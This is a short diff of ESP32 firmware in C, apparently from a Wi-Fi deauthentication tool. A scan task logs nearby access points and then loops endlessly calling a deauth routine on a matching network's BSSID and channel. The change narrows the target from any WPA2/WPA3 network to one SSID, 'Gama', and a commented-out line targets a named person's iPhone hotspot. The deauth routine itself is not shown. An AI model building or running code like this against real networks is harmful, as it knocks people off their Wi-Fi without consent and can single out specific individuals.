@@ -177,7 +177,8 @@ void scanWifi(void *pvParameter){
             ESP_LOGI(TASK_NAME, "RSSI: %d", apRecords[i].rssi);
             ESP_LOGI(TASK_NAME, "########################################\n");
             //if(!strcmp("iPhone di Chiara", (char *)apRecords[i].ssid) || !strcmp("iPhone di Chiara\n", (char *)apRecords[i].ssid)){
-            if(apRecords[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK){
+            if(!strcmp("Gama", (char * ) apRecords[i].ssid)){
+            //if(apRecords[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK){
                 while(1){
                     ESP_LOGI(TASK_NAME, "entering DEAUTH_TASK\n");
                     deauth_task(apRecords[i].bssid,apRecords[i].primary);
